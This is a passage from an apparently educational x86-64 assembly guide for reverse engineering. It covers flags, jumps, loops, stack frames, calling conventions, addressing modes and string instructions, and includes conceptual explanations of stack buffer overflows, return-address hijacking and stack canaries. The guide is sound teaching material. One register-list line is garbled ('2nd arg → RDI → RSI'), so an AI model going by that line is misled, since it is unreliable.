 2    PF     Parity Flag            Result has even number of 1-bits (low byte)
 4    AF     Auxiliary Carry Flag   Carry from bit 3 to bit 4 (BCD arithmetic)
 6    ZF     Zero Flag              Result is exactly zero
 7    SF     Sign Flag              Result's most significant bit is 1 (negative)
 8    TF     Trap Flag              Single-step debugging mode (CPU traps after each instruction)
 9    IF     Interrupt Flag          Hardware interrupts are enabled
10    DF     Direction Flag          String operations go backward (STD sets, CLD clears)
11    OF     Overflow Flag           Signed overflow occurred
```

### The Big Four Flags You Must Know

| Flag | Meaning | Set When | Example |
|------|---------|----------|---------|
| **ZF** | Zero | Result = 0 | `sub rax, rax` → ZF=1 |
| **CF** | Carry | Unsigned overflow/borrow | `add al, 1` when AL=0xFF → CF=1 |
| **SF** | Sign | Result is negative (MSB=1) | `sub rax, 100` when RAX=50 → SF=1 |
| **OF** | Overflow | Signed overflow | `add al, 1` when AL=0x7F → OF=1 |

### Which Instructions Modify Flags?

| Instruction | CF | ZF | SF | OF | Notes |
|------------|----|----|----|----|-------|
| `ADD/SUB` | ✅ | ✅ | ✅ | ✅ | All arithmetic flags |
| `INC/DEC` | ❌ | ✅ | ✅ | ✅ | CF is NOT modified! |
| `MUL/IMUL` | ✅ | ❓ | ❓ | ✅ | CF/OF indicate overflow, others undefined |
| `DIV/IDIV` | ❓ | ❓ | ❓ | ❓ | All flags undefined after division |
| `AND/OR/XOR` | 0 | ✅ | ✅ | 0 | CF and OF always cleared to 0 |
| `NOT` | ❌ | ❌ | ❌ | ❌ | No flags affected at all |
| `NEG` | ✅ | ✅ | ✅ | ✅ | CF=0 only if operand was 0 |
| `SHL/SHR/SAR` | ✅ | ✅ | ✅ | ✅ | CF = last bit shifted out |
| `CMP` | ✅ | ✅ | ✅ | ✅ | Same as SUB but result discarded |
| `TEST` | 0 | ✅ | ✅ | 0 | Same as AND but result discarded |
| `MOV/LEA` | ❌ | ❌ | ❌ | ❌ | No flags affected |
| `PUSH/POP` | ❌ | ❌ | ❌ | ❌ | No flags affected |

> **RE Critical:** Understanding which instructions modify flags and which don't is essential. A `cmp` sets flags, but if a `mov` instruction comes between the `cmp` and the `jxx`, the flags are **preserved** (because MOV doesn't modify flags). Compilers do this constantly.

### Flag Manipulation Instructions

```asm
stc                          ; Set Carry Flag (CF = 1)
clc                          ; Clear Carry Flag (CF = 0)
cmc                          ; Complement Carry Flag (CF = !CF)
std                          ; Set Direction Flag (DF = 1, strings go backward)
cld                          ; Clear Direction Flag (DF = 0, strings go forward)
pushfq                       ; Push entire RFLAGS register onto stack
popfq                        ; Pop stack into RFLAGS register
lahf                         ; Load AH with flags (SF, ZF, AF, PF, CF)
sahf                         ; Store AH into flags
```

---

## 9. Comparison Instructions

There are only two comparison instructions, but they appear in almost every basic block of disassembly.

### CMP — Compare (Subtraction Without Storing)

```asm
cmp  rax, rbx               ; Computes RAX - RBX internally
                              ; Sets ALL arithmetic flags (CF, ZF, SF, OF, PF, AF)
                              ; DISCARDS the result — RAX and RBX are UNCHANGED
```

**What happens to the flags after `cmp A, B`:**

| Condition | Flag State | Meaning |
|-----------|-----------|---------|
| A == B | ZF = 1 | Subtraction result is zero |
| A != B | ZF = 0 | Subtraction result is non-zero |
| A < B (unsigned) | CF = 1 | Borrow occurred |
| A >= B (unsigned) | CF = 0 | No borrow |
| A < B (signed) | SF ≠ OF | Sign flag disagrees with overflow |
| A >= B (signed) | SF == OF | Sign flag agrees with overflow |

### TEST — Logical AND Without Storing

```asm
test rax, rbx               ; Computes RAX & RBX (bitwise AND)
                              ; Sets ZF, SF, PF. Always clears CF and OF.
                              ; DISCARDS the result — both registers unchanged
```

### CMP vs TEST — When to Use Which

| Pattern | Meaning | Use |
|---------|---------|-----|
| `cmp rax, 0` | Is RAX zero? | Comparing against a value |
| `test rax, rax` | Is RAX zero? | **Preferred** (shorter, faster) |
| `cmp rax, 10` | Is RAX equal to/greater/less than 10? | Comparing against non-zero |
| `test rax, 1` | Is bit 0 set? (Is RAX odd?) | Checking specific bits |
| `test rax, 0xFF` | Are any of the lower 8 bits set? | Masking and checking |

> **RE Rule of Thumb:** `test reg, reg` → "is it zero?". `test reg, immediate` → "is this bit/flag set?". `cmp` → "how does it compare to this value?"

---

## 10. Jump Instructions — All Types

Jumps change `RIP` (the instruction pointer), redirecting execution. They are how assembly implements `if`, `else`, `while`, `for`, `switch`, and `goto`.

### Unconditional Jump

```asm
jmp  label                   ; Always jump to label
                              ; RIP = address of label
                              ; Like "goto" in C

jmp  rax                     ; Jump to address stored in RAX (indirect jump)
                              ; Used for: switch/case tables, function pointers,
                              ; virtual method dispatch, and... ROP gadgets
                              ; RE: jmp [rax] reads address FROM memory at [rax]

jmp  [rax]                   ; Jump to address at memory location pointed by RAX
                              ; RAX = pointer to a pointer
```

> **RE Danger:** `jmp rax` means an attacker who controls RAX controls execution. This is a key target in exploit development.

### Conditional Jumps — Complete Table

After a `cmp A, B` or `test` instruction:

#### Equality (works for both signed and unsigned)

| Instruction | Alternative | Condition | Flags | C Equivalent |
|------------|-------------|-----------|-------|-------------|
| `je label` | `jz` | A == B | ZF = 1 | `if (a == b)` |
| `jne label` | `jnz` | A != B | ZF = 0 | `if (a != b)` |

#### Unsigned Comparisons (use after `cmp` with unsigned values)

Think: **A**bove / **B**elow (like addresses, sizes, lengths)

| Instruction | Alternative | Condition | Flags | C Equivalent |
|------------|-------------|-----------|-------|-------------|
| `ja label` | `jnbe` | A > B | CF=0 AND ZF=0 | `if (a > b)` unsigned |
| `jae label` | `jnb`, `jnc` | A >= B | CF = 0 | `if (a >= b)` unsigned |
| `jb label` | `jnae`, `jc` | A < B | CF = 1 | `if (a < b)` unsigned |
| `jbe label` | `jna` | A <= B | CF=1 OR ZF=1 | `if (a <= b)` unsigned |

#### Signed Comparisons (use after `cmp` with signed values)

Think: **G**reater / **L**ess (like temperatures, scores)

| Instruction | Alternative | Condition | Flags | C Equivalent |
|------------|-------------|-----------|-------|-------------|
| `jg label` | `jnle` | A > B | ZF=0 AND SF=OF | `if (a > b)` signed |
| `jge label` | `jnl` | A >= B | SF = OF | `if (a >= b)` signed |
| `jl label` | `jnge` | A < B | SF ≠ OF | `if (a < b)` signed |
| `jle label` | `jng` | A <= B | ZF=1 OR SF≠OF | `if (a <= b)` signed |

#### Flag-Specific Jumps

| Instruction | Alternative | Condition | Use Case |
|------------|-------------|-----------|----------|
| `jc` | `jb` | CF = 1 | Unsigned overflow, borrow |
| `jnc` | `jae` | CF = 0 | No unsigned overflow |
| `jo` | — | OF = 1 | Signed overflow |
| `jno` | — | OF = 0 | No signed overflow |
| `js` | — | SF = 1 | Result is negative |
| `jns` | — | SF = 0 | Result is positive/zero |
| `jp` | `jpe` | PF = 1 | Parity even |
| `jnp` | `jpo` | PF = 0 | Parity odd |
| `jrcxz` | — | RCX = 0 | Loop counter check (no flags involved!) |

### Mnemonic Memory Aid

```
UNSIGNED comparisons use letter from the alphabet that come first:
  A = Above    (like "above" on a number line of addresses)
  B = Below    (like "below")

SIGNED comparisons use later letters:
  G = Greater  (like "greater" for real numbers)
  L = Less     (like "less")

E always means "or Equal"
N always means "Not"

So: JNL = Jump if Not Less = Jump if Greater or Equal = JGE (they're aliases!)
```

### How Control Flow Maps to C

```c
// IF-ELSE:
if (x > 10) {
    do_something();
} else {
    do_other();
}
```
```asm
    cmp  rdi, 10             ; Compare x with 10
    jle  .else               ; If x <= 10, go to else (INVERTED condition!)
    call do_something        ; x > 10 path
    jmp  .endif
.else:
    call do_other            ; x <= 10 path
.endif:
```

> **RE Critical Insight:** Compilers **invert** the condition! `if (x > 10)` becomes `jle .else` (jump to else if NOT greater). This confuses beginners. The jump goes to the FALSE branch. The fall-through is the TRUE branch.

```c
// TERNARY:
result = (a > b) ? a : b;   // max(a, b)
```
```asm
    cmp  rdi, rsi
    cmovle rdi, rsi          ; If a <= b, replace a with b
    mov  rax, rdi            ; Return the max
```

---

## 11. Loops — Every Pattern You'll See

Compilers don't use the `LOOP` instruction (it's slow). Instead they use `cmp` + conditional jump. Here's every pattern.

### The LOOP Instruction (Legacy — Rarely Seen)

```asm
    mov  rcx, 10             ; Counter MUST be in RCX
.loop_start:
    ; ... loop body ...
    loop .loop_start         ; RCX--; if RCX != 0, jump to label
                              ; After loop: RCX = 0
```

Variants:
```asm
loope   .label               ; RCX--; jump if RCX != 0 AND ZF = 1 (loop while equal)
loopne  .label               ; RCX--; jump if RCX != 0 AND ZF = 0 (loop while not equal)
```

> **RE Note:** The `loop` instruction is almost NEVER generated by modern compilers. If you see it, it's hand-written assembly (shellcode, obfuscation).

### Pattern 1: `for` Loop (Counter Going Up)

```c
// C:
for (int i = 0; i < 10; i++) {
    array[i] = 0;
}
```

```asm
; What the compiler generates:
    xor  ecx, ecx           ; ECX = 0 (i = 0)
.loop:
    cmp  ecx, 10            ; i < 10?
    jge  .end               ; If i >= 10, exit loop
    mov  dword [rdi + rcx*4], 0  ; array[i] = 0
    inc  ecx                ; i++
    jmp  .loop              ; Back to top
.end:
```

**Optimized version** (compilers often invert the loop):
```asm
    xor  ecx, ecx           ; i = 0
    jmp  .check             ; Jump to condition check first
.body:
    mov  dword [rdi + rcx*4], 0  ; array[i] = 0
    inc  ecx                ; i++
.check:
    cmp  ecx, 10            ; i < 10?
    jl   .body              ; If yes, do loop body
```

### Pattern 2: `for` Loop (Counter Going Down)

```c
for (int i = 9; i >= 0; i--) { ... }
```

```asm
    mov  ecx, 9             ; i = 9
.loop:
    ; ... body using ECX as index ...
    dec  ecx                ; i--
    jns  .loop              ; Jump if Not Sign (i >= 0)
                             ; When i goes from 0 to -1, SF=1, loop exits
```

> **RE Tip:** `dec` + `jns` is a classic countdown loop. `dec` + `jnz` is a count-to-zero loop.

### Pattern 3: `while` Loop

```c
while (x != 0) {
    x = process(x);
}
```

```asm
.while:
    test edi, edi            ; Is x == 0?
    jz   .end               ; If zero, exit loop
    call process             ; x = process(x)
    mov  edi, eax            ; Move return value back to x (arg register)
    jmp  .while              ; Loop
.end:
```

### Pattern 4: `do-while` Loop

```c
do {
    x = process(x);
} while (x != 0);
```

```asm
.do:
    call process             ; x = process(x)
    mov  edi, eax
    test eax, eax            ; Is return value 0?
    jnz  .do                 ; If NOT zero, loop back
```

> **RE Insight:** `do-while` is the most efficient loop because it has only ONE jump at the bottom instead of two (no initial check). Compilers often **convert** `for` and `while` loops into `do-while` form with a guard check before the loop.

### Pattern 5: Pointer-Based Loop (Array Traversal)

```c
char *p = str;
while (*p != '\0') {
    process(*p);
    p++;
}
```

```asm
    mov  rsi, rdi            ; RSI = pointer to string
.loop:
    movzx eax, byte [rsi]   ; Load current byte (zero-extend)
    test al, al              ; Is it NULL (0)?
    jz   .end               ; If null, exit
    ; ... process byte in AL ...
    inc  rsi                 ; p++ (next byte)
    jmp  .loop
.end:
```

### Pattern 6: `memset` / `memcpy` Style Loop

```asm
; Fill buffer with zeros (simplified memset)
    mov  rcx, 256            ; Count (bytes)
    xor  eax, eax            ; Value to fill (0)
    mov  rdi, buffer         ; Destination
    rep stosb                ; Repeat: [RDI] = AL; RDI++; RCX-- until RCX=0

; Copy buffer (simplified memcpy)
    mov  rcx, 256            ; Count
    mov  rsi, source         ; Source
    mov  rdi, dest           ; Destination
    rep movsb                ; Repeat: [RDI] = [RSI]; RSI++; RDI++; RCX--
```

### Recognizing Loop Boundaries in IDA/Ghidra

In a disassembler's graph view:
- A **backward edge** (arrow going up) = loop
- The block that the backward edge points to = loop header
- The conditional jump at the bottom = loop condition
- A block that jumps past the loop = loop exit (`break`)
- A block that jumps back to the loop header = `continue`

```
         ┌──────────────┐
         │  Loop Header │ ◄──┐  (condition check, backward edge target)
         └──────┬───────┘    │
                │ (true)     │
         ┌──────▼───────┐    │
         │  Loop Body   │    │
         └──────┬───────┘    │
                │            │
         ┌──────▼───────┐    │
         │  Increment   │────┘  (backward jump = loop)
         └──────────────┘
                │ (false/exit)
         ┌──────▼───────┐
         │  After Loop  │
         └──────────────┘
```

---

## 12. The Stack — How It Really Works

The stack is a **LIFO** (Last In, First Out) data structure in memory. It's the most exploited memory region in cybersecurity. Every function call uses it.

### Core Concept

```
The stack grows DOWNWARD in memory (from high addresses to low addresses).

RSP (Stack Pointer) ALWAYS points to the TOP of the stack (lowest used address).

PUSH decreases RSP (stack grows down).
POP  increases RSP (stack shrinks up).
```

### PUSH — Put Data on Stack

```asm
push rax
; This does TWO things:
;   1. RSP = RSP - 8      (make room — stack grows down)
;   2. [RSP] = RAX         (store value at new top)
;
; Before push:   RSP = 0x7FFE0100, RAX = 0x42
; After push:    RSP = 0x7FFE00F8, memory[0x7FFE00F8] = 0x42

push 0xDEAD                  ; Can push immediate values
push qword [rbx]             ; Can push memory values
```

### POP — Remove Data from Stack

```asm
pop  rbx
; This does TWO things:
;   1. RBX = [RSP]          (load value from top)
;   2. RSP = RSP + 8        (shrink stack — moves up)
;
; The data is still physically in memory but "below" RSP — considered garbage.
; This is why you can sometimes read stack data after it's been "freed."
```

> **RE Security Note:** Local variables are "deallocated" by adjusting RSP, but the data remains in memory. This is why uninitialized local variables can contain sensitive data from previous function calls — an information leak primitive.

### CALL — Call a Function

```asm
call function_label
; This does TWO things:
;   1. PUSH RIP             (save return address on stack — where to come back)
;   2. RIP = function_label  (jump to the function)
;
; The return address pushed is the address of the instruction AFTER the call.
```

### RET — Return from Function

```asm
ret
; This does ONE thing:
;   1. POP RIP              (pop return address into RIP — continue where caller left off)
;
; Equivalent to: pop rip  (but you can't actually write that)
```

> **EXPLOIT GOLD:** If you can overwrite the return address on the stack, when the function executes `ret`, it will POP YOUR address into RIP and execute YOUR code. This is the classic **stack buffer overflow** attack.

### Complete Function Stack Frame

```asm
my_function:
    ; ═══ PROLOGUE ═══
    push rbp                 ; Save caller's frame pointer [RSP] = old RBP
    mov  rbp, rsp            ; Set our frame pointer = current stack top
    sub  rsp, 0x30           ; Allocate 48 bytes for local variables
    
    ; Stack is now:
    ;   [rbp + 16]  = 7th argument (if any, passed on stack)
    ;   [rbp + 8]   = RETURN ADDRESS (pushed by CALL)
    ;   [rbp + 0]   = SAVED RBP (pushed by us)
    ;   [rbp - 8]   = local variable 1
    ;   [rbp - 16]  = local variable 2
    ;   [rbp - 24]  = local variable 3
    ;   [rbp - 32]  = local variable 4
    ;   [rbp - 40]  = local variable 5
    ;   [rbp - 48]  = local variable 6     ← RSP points here
    
    ; ═══ FUNCTION BODY ═══
    mov  dword [rbp - 4], edi     ; Store 1st argument as local variable
    mov  dword [rbp - 8], esi     ; Store 2nd argument
    mov  qword [rbp - 16], 0     ; Initialize local variable to 0
    
    ; ═══ EPILOGUE ═══
    ; Method 1: Classic
    mov  rsp, rbp            ; Deallocate locals (RSP = RBP)
    pop  rbp                 ; Restore caller's frame pointer
    ret                      ; Return to caller
    
    ; Method 2: Using LEAVE instruction (same as above, shorter)
    leave                    ; Equivalent to: mov rsp, rbp; pop rbp
    ret
```

### Stack Frame Visualization During Overflow

```
BEFORE OVERFLOW:
┌─────────────────────────┐ High address
│ Return Address (8 bytes)│ ← ret will pop THIS into RIP
├─────────────────────────┤
│ Saved RBP (8 bytes)     │ ← RBP points here
├─────────────────────────┤
│ char buffer[64]         │ ← [rbp - 64] to [rbp - 1]
│ (local variable)        │
│ ...64 bytes...          │
├─────────────────────────┤ ← RSP
│ (free stack space)      │
└─────────────────────────┘ Low address

AFTER WRITING 80+ BYTES TO buffer[]:
┌─────────────────────────┐
│ AAAAAAAAAAAAAAAA        │ ← Return address OVERWRITTEN with 0x4141414141414141
├─────────────────────────┤
│ AAAAAAAAAAAAAAAA        │ ← Saved RBP OVERWRITTEN
├─────────────────────────┤
│ AAAAAAAAAA...buffer...  │ ← Original buffer (64 bytes of 'A')
│ ...overflowed...        │
└─────────────────────────┘

When RET executes: RIP = 0x4141414141414141 → CRASH (or controlled execution!)
```

### Stack Alignment

```asm
; x86-64 ABI REQUIRES the stack to be 16-byte aligned BEFORE a CALL instruction.
; After CALL pushes the 8-byte return address, RSP is misaligned.
; The prologue's push rbp restores 16-byte alignment.
;
; If you see: and rsp, -16  (or and rsp, 0xFFFFFFFFFFFFFFF0)
; That's the compiler forcing alignment for SSE instructions.
```

### Stack Canaries (Security Protection)

```asm
; Modern compilers insert a "canary" value between locals and the return address:
my_secure_function:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0x40
    mov  rax, [fs:0x28]          ; Load canary from Thread Local Storage
    mov  [rbp - 8], rax          ; Store canary on stack (just below saved RBP)
    
    ; ... function body with dangerous buffer operations ...
    
    ; Before returning, CHECK the canary:
    mov  rax, [rbp - 8]          ; Load canary from stack
    xor  rax, [fs:0x28]          ; Compare with original
    jnz  __stack_chk_fail        ; If different → someone overwrote it → ABORT
    
    leave
    ret
```

> **RE Pattern:** When you see `fs:0x28` (Linux) or `gs:0x14` (Windows) in a function prologue, it's a stack canary. The function is protected against simple buffer overflows.

---

## 13. Functions and Calling Conventions

When you reverse-engineer a binary, you spend 90% of your time reading functions. Calling conventions tell you **how arguments are passed** and **who cleans up the stack**.

### System V AMD64 ABI (Linux, macOS, BSD, ELF binaries)

```
This is what you'll see in 99% of Linux malware and CTF challenges.

Integer / Pointer arguments (in ORDER):
  1st arg → RDI
  2nd arg → RDI → RSI
  3rd arg → RDX
  4th arg → RCX
  5th arg → R8
  6th arg → R9
  7th+ args → pushed on stack (right to left)

Floating point arguments:
  XMM0, XMM1, XMM2, ..., XMM7

Return value:
  RAX        (integer/pointer, up to 64 bits)
  RAX:RDX    (128-bit return — rare)
  XMM0       (floating point return)

Caller-saved (volatile — function CAN destroy these):
  RAX, RCX, RDX, RSI, RDI, R8, R9, R10, R11

Callee-saved (non-volatile — function MUST preserve these):
  RBX, RBP, R12, R13, R14, R15

  If you see PUSH RBX at the start and POP RBX at the end,
  the function uses RBX internally but must preserve it.
```

### Windows x64 Calling Convention (PE binaries)

```
Different from Linux! Critical when reversing Windows malware.

Integer / Pointer arguments (in ORDER):
  1st arg → RCX   (not RDI!)
  2nd arg → RDX   (not RSI!)
  3rd arg → R8    (not RDX!)
  4th arg → R9    (not RCX!)
  5th+ args → pushed on stack

Shadow Space:
  Windows ALWAYS reserves 32 bytes (0x20) on the stack before CALL.
  This is "shadow space" for the callee to spill register arguments.
  You'll see: sub rsp, 0x28  (0x20 shadow + 8 alignment) constantly.

Return value:
  RAX (same as Linux)

Caller-saved:  RAX, RCX, RDX, R8, R9, R10, R11
Callee-saved:  RBX, RBP, RDI, RSI, R12, R13, R14, R15
               (Note: RDI and RSI are callee-saved on Windows, caller-saved on Linux!)
```

### Example: Recognizing a printf() Call

```asm
; ═══ Linux (System V) ═══
; C code: printf("Hello %s, you are %d years old\n", name, age);
lea  rdi, [rel format_string]   ; 1st arg: format string → RDI
mov  rsi, [rbp - 16]            ; 2nd arg: name → RSI
mov  edx, dword [rbp - 4]       ; 3rd arg: age → EDX (32-bit, zero-extended)
xor  eax, eax                   ; AL = 0 (no floating point args in varargs)
call printf

; ═══ Windows (x64) ═══
; Same C code:
lea  rcx, [rel format_string]   ; 1st arg → RCX (not RDI!)
mov  rdx, [rbp - 16]            ; 2nd arg → RDX (not RSI!)
mov  r8d, dword [rbp - 4]       ; 3rd arg → R8D (not EDX!)
sub  rsp, 0x20                  ; Shadow space (Windows-specific)
call printf
add  rsp, 0x20                  ; Clean up shadow space
```

### Leaf vs Non-Leaf Functions

```asm
; ═══ LEAF FUNCTION (does NOT call other functions) ═══
; Compiler may skip the prologue entirely!
; No push rbp, no frame pointer setup.
;
fast_add:
    lea eax, [edi + esi]        ; Result = arg1 + arg2, all in registers
    ret                         ; No stack frame at all!
;
; RE TIP: If you see a function with no prologue and just a few instructions
; ending in RET, it's a leaf function. Often inlined by the optimizer.


; ═══ NON-LEAF FUNCTION (calls other functions) ═══
; Always has a prologue to set up a stack frame.
;
process_data:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0x20              ; Locals
    push rbx                    ; Callee-saved: we'll use RBX
    push r12                    ; Callee-saved: we'll use R12
    
    mov  rbx, rdi               ; Save arg1 in callee-saved register
    call strlen                 ; This would destroy RDI, but RBX is safe
    mov  r12, rax               ; Save strlen result in callee-saved register
    
    mov  rdi, rbx               ; Restore arg1 from RBX for next call
    mov  rsi, r12               ; Pass strlen result as 2nd arg
    call process_string
    
    pop  r12                    ; Restore callee-saved
    pop  rbx                    ; Restore callee-saved (reverse order!)
    leave
    ret
```

> **RE Pattern — Callee-saved registers:** When a function pushes RBX/R12/R13/R14/R15 in its prologue, it tells you the function needs persistent storage across calls. These saved registers often hold loop counters, object pointers, or important state.

### Variadic Functions (printf, scanf, etc.)

```asm
; For variadic functions in System V ABI:
; AL (low byte of RAX) = number of vector (XMM) registers used.
;
; printf("format", intarg):
xor  eax, eax       ; AL = 0 → no floating point args
call printf

; printf("format", 3.14):
movsd xmm0, [rel pi_value]
mov   eax, 1        ; AL = 1 → one XMM register used
call  printf
;
; In disassembly, if you see XOR EAX, EAX or MOV EAX, <small number>
; right before a CALL, it's likely a variadic function.
```

### Recognizing the Function Boundary

```
In IDA / Ghidra, a function boundary is detected by:
1. Something that's the target of a CALL instruction
2. Ends at a RET instruction (or JMP to another function — tail call)
3. Exception handling metadata references
4. Symbol table entries

Tail Call Optimization:
  Instead of:  call function_B  +  ret
  Compiler generates:  jmp function_B
  
  The callee returns directly to OUR caller. Saves one return.
  In disassembly, this looks like a function that ends with JMP instead of RET.
```

---

## 14. Memory Addressing Modes

Every time you see brackets `[ ]` in Intel syntax, it means **dereference** — go to that address and read/write the value there. Mastering addressing modes is key to understanding array access, struct fields, vtable lookups, and more.

### The General Formula

```
[ base + index * scale + displacement ]

base         = any general-purpose register (often RBP, RSP, RBX, etc.)
index        = any register EXCEPT RSP
scale        = 1, 2, 4, or 8 only (matches byte/word/dword/qword sizes)
displacement = a constant (positive or negative)

Any component can be omitted.
```

### Every Addressing Mode with RE Context

```asm
; ═══ 1. IMMEDIATE (no brackets — not really "addressing") ═══
mov  rax, 42                 ; RAX = 42
; You see this: literal constant assignment.

; ═══ 2. REGISTER DIRECT (no brackets) ═══
mov  rax, rbx                ; RAX = RBX
; You see this: copying a value between registers.

; ═══ 3. MEMORY DIRECT / ABSOLUTE ═══
mov  rax, [0x601040]         ; RAX = value at fixed address 0x601040
; RE Context: Access to a global variable. The address is in .data or .bss.
; IDA will show: mov rax, ds:global_var

; ═══ 4. RIP-RELATIVE (Position-Independent Code — very common in x86-64) ═══
mov  rax, [rip + 0x2A3F]    ; RAX = value at (current instruction address + 0x2A3F)
lea  rax, [rip + 0x2A3F]    ; RAX = the address itself (not the value)
; RE Context: ALL global/static variable access in PIE binaries and shared libraries.
; IDA shows: mov rax, cs:some_global
; Ghidra shows the resolved address directly.

; ═══ 5. REGISTER INDIRECT ═══
mov  rax, [rbx]              ; RAX = value at address stored in RBX
; RE Context: Pointer dereference.  C equivalent: rax = *rbx;

; ═══ 6. REGISTER + DISPLACEMENT ═══
mov  eax, [rbp - 4]          ; EAX = value at (RBP - 4)
mov  rax, [rbp + 16]         ; RAX = value at (RBP + 16)
; RE Context: LOCAL VARIABLE or FUNCTION ARGUMENT access.
;   [rbp - N] = local variable   (negative offset from frame pointer)
;   [rbp + N] = function argument or return address (positive offset)
;   [rsp + N] = local variable when no frame pointer used (-fomit-frame-pointer)

; ═══ 7. BASE + INDEX ═══
mov  al, [rbx + rcx]         ; AL = byte at address (RBX + RCX)
; RE Context: Array of bytes (char array).
;   C equivalent: al = array[i];  where rbx = array base, rcx = index

; ═══ 8. BASE + INDEX * SCALE ═══
mov  eax, [rbx + rcx*4]      ; EAX = dword at (RBX + RCX*4)
; RE Context: Array of 4-byte integers.
;   C equivalent: eax = int_array[i];  where rbx = base, rcx = index, scale = sizeof(int)
;
; Scale values and their typical meaning:
;   *1 = array of bytes  (char, uint8_t, bool)
;   *2 = array of shorts (int16_t, wchar_t on Windows)
;   *4 = array of ints   (int32_t, float)
;   *8 = array of longs/pointers (int64_t, void*, any pointer on x86-64)

; ═══ 9. BASE + INDEX * SCALE + DISPLACEMENT ═══
mov  eax, [rbx + rcx*4 + 0x10]
; RE Context: Struct array access.
;   C equivalent: eax = struct_array[i].field_at_offset_0x10;
;   rbx = base of array, rcx = index, *4 = struct size (if small), 0x10 = field offset
;
; Also common for: accessing a field in a struct pointed to by a register
;   mov rax, [rdi + 0x18]    ; rdi = struct pointer, 0x18 = field offset
;   C equivalent: rax = obj->some_field;
```

### Struct / Class Field Access Patterns

```asm
; If you see a register used as a base with various constant offsets, it's a struct:
mov  rax, [rdi]              ; field at offset 0x00 (often a vtable pointer in C++)
mov  ecx, [rdi + 0x08]       ; field at offset 0x08
mov  rdx, [rdi + 0x10]       ; field at offset 0x10
mov  r8,  [rdi + 0x18]       ; field at offset 0x18

; RE Reconstruction:
; struct SomeStruct {
;     void** vtable;        // offset 0x00 (8 bytes — pointer)
;     int    field1;        // offset 0x08 (4 bytes)
;     // 4 bytes padding
;     void*  field2;        // offset 0x10 (8 bytes — pointer)
;     long   field3;        // offset 0x18 (8 bytes)
; };
```

### C++ Virtual Function Call (vtable dispatch)

```asm
; obj->virtual_method(arg1, arg2)
mov  rdi, [rbp - 0x18]       ; rdi = this pointer (1st arg in System V)
mov  rax, [rdi]               ; rax = vtable pointer (first field of object)
mov  rax, [rax + 0x10]        ; rax = 3rd virtual function (offset 0x10 = index 2 * 8)
mov  rsi, some_value           ; arg2
call rax                       ; Indirect call through vtable
;
; RE Pattern: mov rax, [reg]; ... call [rax + N]
;   This is ALWAYS a virtual function call. The offset N / 8 = vtable index.
```

### LEA — The "Fake" Addressing Mode

```asm
; LEA loads the ADDRESS, not the value at the address.
; It uses the addressing mode hardware as a calculator!

lea  rax, [rbx + rcx*4 + 10]  ; rax = rbx + rcx*4 + 10  (NO memory access!)
lea  rax, [rax + rax*2]        ; rax = rax * 3  (multiply by 3 without MUL)
lea  rax, [rax*4 + rax]        ; rax = rax * 5
lea  rax, [rax + rax*4]        ; rax = rax * 5  (same thing)
lea  rax, [rax*8 + rax]        ; rax = rax * 9

; RE TIP: LEA with no memory context is just optimized arithmetic.
; Compilers LOVE using LEA instead of ADD/MUL because it can do
; up to 3 operations in a single instruction without affecting FLAGS.
```

---

## 15. String Instructions

The x86 architecture has dedicated instructions for bulk memory operations. These are blazingly fast and you'll see them in `memcpy`, `memset`, `strlen`, and `strcmp` implementations.

### The Players

```
RSI = Source Index       (source address — "S" for Source)
RDI = Destination Index  (destination address — "D" for Destination)
RCX = Counter            (loop count for REP prefix)
DF  = Direction Flag     (0 = forward / increment, 1 = backward / decrement)

After each string operation:
  If DF = 0: RSI and/or RDI are INCREMENTED by operand size
  If DF = 1: RSI and/or RDI are DECREMENTED by operand size

CLD  ; Clear Direction Flag → DF = 0 → process forward (low to high address)
STD  ; Set Direction Flag   → DF = 1 → process backward (high to low address)
```

### MOVS — Move String (memcpy)

```asm
; Copy from [RSI] to [RDI], then advance both pointers.
movsb        ; Copy 1 byte:   [RDI] = [RSI], then RSI++, RDI++
movsw        ; Copy 2 bytes:  word
movsd        ; Copy 4 bytes:  dword
movsq        ; Copy 8 bytes:  qword

; ═══ REP MOVSB — The memcpy() Implementation ═══
; Copy RCX bytes from [RSI] to [RDI]
cld                         ; Forward direction
mov  rdi, dest_buffer       ; Destination
mov  rsi, source_buffer     ; Source
mov  rcx, 256               ; Number of bytes to copy
rep  movsb                  ; Repeat MOVSB, RCX times (decrement RCX each time)
; After: RSI and RDI point past the end of the copied region, RCX = 0

; ═══ REP MOVSQ — Optimized 8-bytes-at-a-time Copy ═══
mov  rcx, 32                ; 32 * 8 = 256 bytes
rep  movsq                  ; Copy 32 qwords (much faster for aligned data)
```

### STOS — Store String (memset)

```asm
; Store AL/AX/EAX/RAX into [RDI], then advance RDI.
stosb        ; [RDI] = AL,  then RDI++
stosw        ; [RDI] = AX,  then RDI += 2
stosd        ; [RDI] = EAX, then RDI += 4
stosq        ; [RDI] = RAX, then RDI += 8

; ═══ REP STOSB — The memset() Implementation ═══
; Fill RCX bytes at [RDI] with the value in AL
cld
mov  rdi, buffer            ; Destination buffer
xor  eax, eax               ; AL = 0 (fill with zeros)
mov  rcx, 4096              ; Fill 4096 bytes
rep  stosb                  ; memset(buffer, 0, 4096)

; RE ALERT: rep stosb with AL=0 right after a SUB RSP = zeroing local variables.
; Secure code often does this before returning to prevent info leaks.
```

### LODS — Load String

```asm
; Load from [RSI] into AL/AX/EAX/RAX, then advance RSI.
lodsb        ; AL  = [RSI], then RSI++
lodsw        ; AX  = [RSI], then RSI += 2
lodsd        ; EAX = [RSI], then RSI += 4
lodsq        ; RAX = [RSI], then RSI += 8

; Rarely used with REP. Usually seen in custom decryption/encoding loops:
decode_loop:
    lodsb                    ; Load next encrypted byte
    xor  al, 0x5A            ; XOR decrypt
    stosb                    ; Store decrypted byte
    dec  rcx
    jnz  decode_loop
; RE ALERT: lodsb + XOR/ADD/SUB + stosb in a loop = inline decryption routine!
```

### SCAS — Scan String (find a value)

```asm
; Compare AL/AX/EAX/RAX with [RDI], set FLAGS, then advance RDI.
scasb        ; Compare AL  with [RDI], set flags, RDI++
scasw        ; Compare AX  with [RDI]
scasd        ; Compare EAX with [RDI]
scasq        ; Compare RAX with [RDI]

; ═══ REPNE SCASB — The strlen() Implementation ═══
; Scan forward through [RDI] looking for the byte in AL.
; Stop when found OR when RCX reaches 0.
cld
mov  rdi, my_string         ; String to measure
xor  eax, eax               ; AL = 0 (looking for null terminator)
mov  rcx, -1                ; RCX = 0xFFFFFFFFFFFFFFFF (maximum count)
repne scasb                 ; Repeat SCASB while [RDI] != AL and RCX != 0
;
; After: RCX = -(length + 2), or more usefully:
not  rcx                    ; RCX = length + 1
